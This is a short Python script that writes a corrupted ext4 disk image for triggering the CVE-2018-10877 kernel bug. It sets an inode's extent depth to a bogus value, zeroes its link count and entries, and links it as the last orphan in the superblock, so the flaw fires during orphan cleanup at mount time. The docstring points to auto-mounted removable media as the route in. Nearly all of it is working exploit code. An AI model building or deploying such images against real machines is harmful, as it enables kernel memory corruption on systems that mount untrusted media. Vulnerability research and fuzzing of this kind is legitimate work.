#!/usr/bin/env python3
"""Put an eh_depth-corrupted inode on the ext4 orphan list.

Goal: reach ext4_find_extent()/ext4_ext_remove_space() from ext4_orphan_cleanup()
during ext4_fill_super(), i.e. make the CVE-2018-10877 primitive fire at MOUNT
time instead of needing a readdir.  Only meaningful on a rw mount (storaged
mounts removable media rw first, ro only as an EROFS fallback).

usage: mk-orphan.py IMG.img INODE [DEPTH]
"""
import struct
import sys

S_LAST_ORPHAN = 0xE8


def main():
    img, ino = sys.argv[1], int(sys.argv[2])
    depth = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0xFFFF
    with open(img, "r+b") as f:
        f.seek(1024)
        sb = f.read(1024)
        bs = 1024 << struct.unpack_from("<I", sb, 0x18)[0]
        first_data_block = struct.unpack_from("<I", sb, 0x14)[0]
        ipg = struct.unpack_from("<I", sb, 0x28)[0]
        isize = struct.unpack_from("<H", sb, 0x58)[0]

        group, index = (ino - 1) // ipg, (ino - 1) % ipg
        f.seek((first_data_block + 1) * bs + group * 32)
        itable = struct.unpack_from("<I", f.read(32), 8)[0]
        ino_off = itable * bs + index * isize

        f.seek(ino_off)
        raw = bytearray(f.read(isize))
        mode, links = struct.unpack_from("<H", raw, 0)[0], struct.unpack_from("<H", raw, 0x1A)[0]
        magic, entries, emax, edepth = struct.unpack_from("<HHHH", raw, 0x28)
        print(f"inode {ino} @0x{ino_off:x}: mode=0o{mode:o} links={links} "
              f"eh(magic=0x{magic:04x} entries={entries} max={emax} depth={edepth})")
        if magic != 0xF30A:
            sys.exit("inode is not extent-mapped")

        struct.pack_into("<H", raw, 0x1A, 0)          # i_links_count = 0 -> "unreferenced"
        struct.pack_into("<I", raw, 0x14, 0)          # i_dtime = next orphan = end of list
        struct.pack_into("<H", raw, 0x28 + 2, 0)      # eh_entries = 0
        struct.pack_into("<H", raw, 0x28 + 6, depth)  # eh_depth
        f.seek(ino_off)
        f.write(raw)

        f.seek(1024 + S_LAST_ORPHAN)
        f.write(struct.pack("<I", ino))
        print(f"  -> links=0, dtime=0, eh_entries=0, eh_depth=0x{depth:04x}, "
              f"s_last_orphan={ino}")


main()
